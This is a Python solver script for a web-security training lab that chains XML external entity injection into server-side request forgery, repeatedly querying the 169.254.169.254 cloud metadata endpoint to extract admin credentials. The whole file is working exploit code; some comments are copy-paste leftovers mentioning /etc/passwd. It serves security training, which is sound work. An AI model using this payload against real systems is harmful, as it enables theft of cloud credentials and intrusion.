#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 15/10/2023
#
# Lab: Exploiting XXE to perform SSRF attacks
#
# Steps: 1. Inject payload into 'productId' XML element to retrieve the path via SSRF
#        2. Extract the path from the response
#        3. Repeat the process with the new extracted path until you fetch 
#           the admin information
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0a0600cc04a5fc74810d58f1000000a7.web-security-academy.net"

print(Fore.BLUE + "âŸª#âŸ« Injection point: " + Fore.YELLOW + "productId")

# set content-type header
headers = {
    "Content-Type": "application/xml"
}

# the list that will hold all paths
paths = ["/"]

# we need 6 requests to solve this lab
for i in range(0,6):
    # get the next path of the list
    path = paths[i]

    # payload to retrieve the content of /etc/passwd
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254{path}">]>
                <stockCheck>
                    <productId>
                        &xxe;
                    </productId>
                    <storeId>
                        1
                    </storeId>external entities
                    external entities
                </stockCheck>"""

    try:
        # fetch the page with the injected payload
        injection = requests.post(f"{url}/product/stock", data=payload, headers=headers)

    except:
        print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
        exit(1)
    
    # extract the first line of /etc/passwd
    new_path = re.findall("ID:\s*(.*)\s*", injection.text)[0]

    # concat the new_path with the previous one and push the result to the list of paths
    paths.append(f"{path}{new_path}/")

    # don't print the initial request
    if i != 0:
        print(Fore.WHITE + f"â¦—{i}â¦˜ Injecting payload to retrieve retrieve the path number " + Fore.BLUE + str(i) + Fore.WHITE + ".. " 
            + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + paths[i])


print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")


